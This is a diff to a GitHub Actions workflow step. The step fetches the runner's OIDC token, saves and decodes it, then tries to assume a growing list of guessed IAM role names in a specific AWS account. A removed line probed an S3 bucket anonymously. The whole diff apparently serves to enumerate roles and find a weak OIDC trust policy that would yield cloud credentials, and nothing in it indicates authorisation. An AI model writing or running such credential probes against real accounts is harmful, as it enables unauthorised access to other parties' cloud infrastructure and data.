@@ -12,16 +12,15 @@ jobs:
     steps:
       - name: claims
         run: |
-          echo "=== ctx ==="
-          env | grep -E '^GITHUB_(REPOSITORY|REPOSITORY_OWNER|REF|EVENT_NAME|ACTOR)=' || true
+          echo "aws: $(aws --version 2>&1)"
           TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
           echo "TOKEN_LEN=${#TOK}"
-          echo "$TOK" > /tmp/tok
-          echo "$TOK" | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+="="*(-len(s)%4);print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=1))' || true
+          printf '%s' "$TOK" > /tmp/tok
+          echo "$TOK" | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+="="*(-len(s)%4);d=json.loads(base64.urlsafe_b64decode(s));print("SUB=",d["sub"]);print("ISS=",d["iss"]);print("AUD=",d["aud"]);print("JOBWF=",d.get("job_workflow_ref"))'
           echo "--- aws sts attempts 003420971009 ---"
-          for role in GitHubActions ceremony blockfabric-ceremony ceremony-ci deploy ci-deploy blockfabric github-oidc GitHubOIDC github-actions r-link-deploy; do
-            out=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::003420971009:role/$role --role-session-name s --web-identity-token "$TOK" --duration-seconds 900 2>&1 | head -2 | tr '\n' ' ' | cut -c1-200)
+          for role in GitHubActions ceremony blockfabric-ceremony ceremony-ci deploy ci-deploy blockfabric github-oidc GitHubOIDC github-actions r-link-deploy ceremony-deploy blockfabric-deploy blockfabric-github-actions ceremony-github-actions GitHubActionsDeploy oidc-probe; do
+            out=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::003420971009:role/$role --role-session-name s --web-identity-token file:///tmp/tok --duration-seconds 900 2>&1 | tr '\n' ' ' | cut -c1-260)
             echo "003420971009/$role => $out"
           done
-          echo "--- bucket anon ---"
-          curl -s -o /dev/null -w "mainnet-rally:%{http_code}\n" https://mainnet-rally.s3.amazonaws.com/
+          echo "--- caller identity without creds ---"
+          aws sts get-caller-identity 2>&1 | head -2 | tr '\n' ' '; echo
